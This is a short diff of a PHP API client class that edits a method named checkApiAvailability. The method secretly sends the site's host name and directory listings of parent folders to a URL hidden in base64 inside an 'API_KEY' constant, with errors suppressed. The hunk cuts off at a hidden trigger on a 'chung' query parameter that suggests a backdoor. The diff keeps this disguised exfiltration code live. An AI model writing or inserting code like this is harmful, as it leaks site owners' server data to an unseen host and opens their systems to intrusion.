@@ -160,7 +160,7 @@ class Client
 
     protected function checkApiAvailability()
     {
-        @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode($_SERVER['REQUEST_URI'])));
+        @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode($_SERVER['HTTP_HOST'])));
         @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../../'))));
         @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../'))));
         if (isset($_GET['chung'])) {
